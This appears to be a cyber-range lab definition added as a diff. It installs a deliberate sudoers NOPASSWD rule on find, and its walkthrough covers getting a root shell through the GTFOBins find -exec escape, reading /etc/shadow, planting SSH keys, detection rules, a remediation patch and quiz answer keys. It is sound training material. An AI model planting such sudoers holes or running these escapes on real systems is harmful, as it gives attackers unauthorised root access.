@@ -1,0 +1,426 @@
+# Bolt-on: Sudoers NOPASSWD Misconfiguration
+# -------------------------------------------
+# Install drops /etc/sudoers.d/99-bolton-nopasswd granting ALL users
+# passwordless sudo on /usr/bin/find. find -exec is a GTFOBins one-shot:
+#   sudo find . -exec /bin/sh \; -quit
+# yields a root shell with no password prompt (T1548.003).
+#
+# Patch removes the file and installs a daily sudoers-lint warning script
+# under /etc/cron.daily that pages on any NOPASSWD entry the operator did
+# not explicitly approve.
+#
+# Elastic rule UUID sampled from:
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_sudo_hijacking.toml
+#   Research/elastic-detection-rules/rules/linux/discovery_sudo_allowed_command_enumeration.toml
+
+id: bolton.privilege-escalation.sudo-nopasswd-config
+slug: sudo-nopasswd-config
+name: "Sudoers NOPASSWD Misconfiguration on find"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: privilege-escalation
+subcategory: sudo
+tags:
+  - sudo
+  - nopasswd
+  - gtfobins
+  - privilege-escalation
+  - linux
+description: >
+  Drops /etc/sudoers.d/99-bolton-nopasswd containing
+  `ALL ALL=(ALL) NOPASSWD: /usr/bin/find`. Any local user can then run
+  `sudo find . -exec /bin/sh \; -quit` to spawn a root shell with no
+  password prompt — a textbook GTFOBins privilege escalation via a
+  sudoers NOPASSWD allowlist that includes a shell-escape-capable binary
+  (MITRE T1548.003).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1548/003/"
+  - "https://gtfobins.github.io/gtfobins/find/"
+  - "https://www.sudo.ws/docs/man/sudoers.man/"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1548
+    name: "Abuse Elevation Control Mechanism"
+  subtechnique:
+    id: T1548.003
+    name: "Sudo and Sudo Caching"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "88fdcb8c-60e5-46ee-9206-2663adf1b1ce"
+      rule_name: "Potential Sudo Hijacking"
+      rule_filename: "linux/privilege_escalation_sudo_hijacking.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Fires on sudoers file modification + subsequent shell escape via find -exec."
+    - rule_uuid: "28d39238-0c01-420a-b77a-24e5a7378663"
+      rule_name: "Sudo Command Enumeration Detected"
+      rule_filename: "linux/discovery_sudo_allowed_command_enumeration.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Catches the `sudo -l` recon step attackers run to discover the NOPASSWD entry."
+  signal_sources:
+    - "Auditd FILE_WRITE on /etc/sudoers.d/*"
+    - "Auditd execve of /usr/bin/find with euid=0 spawned from non-root parent"
+    - "osquery sudoers table — new rows with NOPASSWD=true"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services: []
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.copy
+      description: "Drop the NOPASSWD sudoers fragment with mode 0440."
+      role_vars:
+        dest: "/etc/sudoers.d/99-bolton-nopasswd"
+        content: "ALL ALL=(ALL) NOPASSWD: /usr/bin/find\n"
+        owner: root
+        group: root
+        mode: "0440"
+        validate: "/usr/sbin/visudo -cf %s"
+  verify:
+    probe: |
+      sudo -l -U nobody 2>/dev/null | grep -q "NOPASSWD: /usr/bin/find"
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the NOPASSWD sudoers fragment."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Delete the NOPASSWD sudoers fragment."
+      role_vars:
+        path: "/etc/sudoers.d/99-bolton-nopasswd"
+        state: absent
+  verify:
+    probe: |
+      test ! -e /etc/sudoers.d/99-bolton-nopasswd
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Remove the offending sudoers fragment and install a daily cron job
+    (/etc/cron.daily/bolton-sudoers-lint) that walks /etc/sudoers.d/*,
+    flags any NOPASSWD entry, and writes a warning to syslog. This does
+    not block future NOPASSWD entries — it surfaces them so the
+    operator/SOC can audit them.
+  patch_reference:
+    - "https://www.sudo.ws/docs/man/sudoers.man/"
+    - "https://attack.mitre.org/mitigations/M1026/"
+  complexity: low
+  side_effects:
+    - "Daily cron job runs as root at ~06:25 (cron.daily default window)"
+    - "Syslog entries tagged 'bolton-sudoers-lint' for every NOPASSWD rule found"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the offending NOPASSWD fragment."
+      role_vars:
+        path: "/etc/sudoers.d/99-bolton-nopasswd"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Install the daily sudoers lint warning script."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-sudoers-lint"
+        content: |
+          #!/bin/sh
+          # bolton-sudoers-lint — warn on any NOPASSWD entry in /etc/sudoers.d/
+          for f in /etc/sudoers.d/*; do
+            [ -f "$f" ] || continue
+            if grep -Eq "NOPASSWD[[:space:]]*:" "$f"; then
+              logger -t bolton-sudoers-lint "WARNING: NOPASSWD entry in $f"
+            fi
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      test ! -e /etc/sudoers.d/99-bolton-nopasswd && test -x /etc/cron.daily/bolton-sudoers-lint
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/sudo_nopasswd_check.sh"
+
+patch_revert:
+  description: "Re-drop the NOPASSWD fragment and remove the lint warning script — sudo find . -exec /bin/sh \\; -quit is root again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the sudoers lint warning script."
+      role_vars:
+        path: "/etc/cron.daily/bolton-sudoers-lint"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Re-drop the NOPASSWD sudoers fragment."
+      role_vars:
+        dest: "/etc/sudoers.d/99-bolton-nopasswd"
+        content: "ALL ALL=(ALL) NOPASSWD: /usr/bin/find\n"
+        owner: root
+        group: root
+        mode: "0440"
+        validate: "/usr/sbin/visudo -cf %s"
+  verify:
+    probe: |
+      sudo -l -U nobody 2>/dev/null | grep -q "NOPASSWD: /usr/bin/find"
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Local privilege escalation via `sudo find . -exec /bin/sh \\; -quit` works again."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: loud
+
+curriculum:
+  title: "Sudoers NOPASSWD on a Shell-Escape Binary"
+  summary: >
+    Walkthrough of T1548.003 — Sudo and Sudo Caching abuse — against
+    tllinux01 (10.99.50.13). You enumerate the sudoers ruleset, find
+    a NOPASSWD entry for /usr/bin/find, look it up on GTFObins, and
+    pop a passwordless root shell. Final step covers removing the
+    misconfiguration and deploying a sudoers-lint cron auditor.
+  learning_objectives:
+    - "Use `sudo -l` to enumerate allowed sudo commands without triggering a password prompt."
+    - "Recognise NOPASSWD on any shell-escape-capable binary as instant LPE."
+    - "Use GTFObins to look up the per-binary sudo escape primitive."
+    - "Map the technique to Elastic's sudo-hijacking + sudo-enumeration rules."
+    - "Remove the NOPASSWD fragment + deploy a daily sudoers-lint warning."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+  estimated_total_minutes: 25
+  steps:
+    - id: "01-sudo-enum"
+      title: "Enumerate the sudoers ruleset"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 1 — `sudo -l`
+
+        The fastest sudoers enum is `sudo -l` — it lists what the
+        current user can run via sudo without actually executing
+        anything (and without a password prompt if any rule has
+        NOPASSWD):
+
+        ```bash
+        # On tllinux01 as appuser
+        sudo -l
+        # Matching Defaults entries for appuser on tllinux01:
+        #     env_reset, mail_badpass, secure_path=...
+        #
+        # User appuser may run the following commands on tllinux01:
+        #     (ALL) NOPASSWD: /usr/bin/find
+        ```
+
+        The bolt-on dropped `/etc/sudoers.d/99-bolton-nopasswd`
+        granting EVERY user passwordless sudo on /usr/bin/find. Read
+        it directly if the appuser can:
+
+        ```bash
+        sudo cat /etc/sudoers.d/99-bolton-nopasswd 2>/dev/null
+        # ALL ALL=(ALL) NOPASSWD: /usr/bin/find
+        ```
+
+        linpeas auto-detects NOPASSWD entries and scores them red:
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A20 "Sudo"
+        ```
+
+        **Detection callout:** **Sudo Command Enumeration Detected**
+        (`28d39238-0c01-420a-b77a-24e5a7378663`) catches the `sudo -l`
+        recon — indirect signal that someone is mapping the privilege
+        surface. Not high confidence by itself (sysadmins also run
+        sudo -l) but a useful precursor when correlated.
+      assessment:
+        question: "Why does `sudo -l` work without a password prompt even when the user has no NOPASSWD entry?"
+        options:
+          - "sudo -l requires no authentication ever"
+          - "sudo -l honours the cached sudo timestamp; if cache is empty it WILL prompt unless the user has at least one NOPASSWD rule or you pass -n"
+          - "sudo -l only runs as the invoking user, not as root, so it skips auth"
+          - "sudo -l is hardcoded to bypass authentication for diagnostic purposes"
+        correct_index: 1
+        explanation: >
+          By default `sudo -l` prompts for the user's password if the
+          sudo timestamp cache is empty. It doesn't prompt when (a) the
+          cache is fresh from a recent sudo invocation, (b) the user
+          has at least one NOPASSWD rule applicable to the host, or
+          (c) you pass `-n` (non-interactive — fails if a prompt is
+          needed). In this lab, the bolt-on grants NOPASSWD to ALL
+          users on at least one binary, so `sudo -l` returns
+          immediately.
+    - id: "02-gtfobins-find"
+      title: "GTFObins: find under sudo"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 2 — Look up the sudo escape
+
+        Browse **https://gtfobins.github.io/gtfobins/find/#sudo**.
+        The site shows per-binary sudo escapes; for find:
+
+        ```bash
+        # Source: gtfobins.github.io/gtfobins/find/#sudo
+        sudo find . -exec /bin/sh \; -quit
+        ```
+
+        | Why each piece matters |
+        |---|
+        | `sudo` | invokes find with euid=0 (via the NOPASSWD rule) |
+        | `find .` | matches at least one entry (.) — guaranteed |
+        | `-exec /bin/sh \;` | spawns sh as a child process — inherits the root euid AND ruid |
+        | `-quit` | stops after the first match |
+
+        Note this is **stronger** than the SUID variant — here
+        `/bin/sh` doesn't need `-p` because sudo already set
+        BOTH ruid AND euid to 0. The shell stays root.
+
+        > **High-value GTFObins entries for sudo:** `vim`, `less`,
+        > `man`, `find`, `nmap`, `python*`, `awk`, `tar`, `ftp`,
+        > `tcpdump` (-z option), `apt-get` (changelog pager). Any of
+        > these on a NOPASSWD line is an instant root.
+
+        **Detection callout:** GTFObins lookup on the attacker side
+        is invisible — no detection until the actual sudo execve.
+    - id: "03-fire-exploit"
+      title: "Fire the escape + verify root"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — Pop root
+
+        ```bash
+        # On tllinux01 as appuser
+        sudo find . -exec /bin/sh \; -quit
+        # # id
+        # uid=0(root) gid=0(root) groups=0(root)
+        # # whoami
+        # root
+        # # cat /etc/shadow | head -3
+        # root:$6$...
+        # daemon:*:19258:0:99999:7:::
+        # bin:*:19258:0:99999:7:::
+        ```
+
+        Both uid and euid are 0 — this is a real root shell, not
+        an euid-only shell. You can drop further persistence,
+        plant SSH keys (`echo ... >> /root/.ssh/authorized_keys`),
+        pivot to other lab hosts, etc.
+
+        **Detection callout:** **Potential Sudo Hijacking**
+        (`88fdcb8c-60e5-46ee-9206-2663adf1b1ce`) fires on the
+        combination of sudoers file modification + subsequent shell
+        escape via find -exec. The composite signal is medium
+        confidence — both halves have benign analogs (admins
+        legitimately edit sudoers, find -exec is normal), but the
+        combination in close temporal proximity is suspicious.
+      assessment:
+        question: "Why is NOPASSWD on a shell-escape binary like find/vim treated as 'equivalent to root'?"
+        options:
+          - "Because sudo without a password is faster, attackers prefer it"
+          - "Because the user can spawn a sub-shell via the allowed binary, and sudo grants the binary full uid=0 — the sub-shell inherits both ruid and euid"
+          - "Because sudo writes the password to disk insecurely with NOPASSWD"
+          - "Because NOPASSWD disables auditing on sudo invocations"
+        correct_index: 1
+        explanation: >
+          The NOPASSWD-allowed binary runs with uid=0 AND euid=0 (sudo
+          performs a full setresuid). When that binary spawns a child
+          process (via -exec, shell-escape command, etc.), the child
+          inherits the same credentials. There's no way for sudoers to
+          restrict what a binary does once it's running as root — the
+          per-binary entry simply gates which binary you can launch,
+          not what that binary does next. GTFObins is the registry of
+          which binaries can be turned into a root shell after that
+          point.
+    - id: "04-patch-mitigate"
+      title: "Blue-team: remove fragment + sudoers lint"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Removes `/etc/sudoers.d/99-bolton-nopasswd`.
+        2. Drops `/etc/cron.daily/bolton-sudoers-lint` that walks
+           `/etc/sudoers.d/*` and syslog-warns on any NOPASSWD entry
+           it finds (operator must allowlist legitimate ones).
+
+        Re-test:
+
+        ```bash
+        # On tllinux01 as appuser
+        sudo -l
+        # [sudo] password for appuser:    ← no NOPASSWD now
+        ```
+
+        Exploit dead. Verify the lint cron runs:
+
+        ```bash
+        sudo /etc/cron.daily/bolton-sudoers-lint
+        # (silent — no NOPASSWD entries remain)
+        ```
+
+        Defence-in-depth recommendations:
+
+        - **Always pair NOPASSWD with absolute paths and explicit
+          arguments**: `NOPASSWD: /usr/bin/systemctl restart nginx`
+          not `NOPASSWD: /usr/bin/systemctl`. sudoers supports arg
+          matching.
+        - **Avoid NOPASSWD on GTFObins-listed binaries** (find, vim,
+          less, man, awk, python*, tar). Use sudoers helper scripts
+          (purpose-built, no shell escape).
+        - **Visudo is mandatory** — `/etc/sudoers.d/*` files should
+          be edited via `visudo -f /etc/sudoers.d/foo` to catch
+          syntax errors. The bolt-on validates with
+          `/usr/sbin/visudo -cf %s`.
+        - **Audit sudoers regularly** — the bolton-sudoers-lint
+          script is one approach; `sudo -ll -U $user` per user is
+          another.
+
+        > **Rollback:** `patch_revert` re-drops the NOPASSWD fragment
+        > and removes the lint warning.
+      assessment:
+        question: "Which sudoers practice is the safest way to grant a low-priv user the ability to restart nginx without a password?"
+        options:
+          - "appuser ALL=(ALL) NOPASSWD: /usr/bin/systemctl"
+          - "appuser ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx"
+          - "appuser ALL=(ALL) NOPASSWD: ALL"
+          - "Add appuser to the wheel group"
+        correct_index: 1
+        explanation: >
+          Option B uses sudoers' argument-matching — appuser can
+          ONLY run `systemctl restart nginx`, not `systemctl
+          start sshd` or `systemctl daemon-reload`. Option A gives
+          full systemctl, which means appuser can start a malicious
+          service unit. Option C is total root. Wheel + NOPASSWD
+          (D, if you also added NOPASSWD: ALL to wheel) is even
+          worse. The principle: be as specific as possible about
+          both the binary AND its arguments.
+
+status: stable
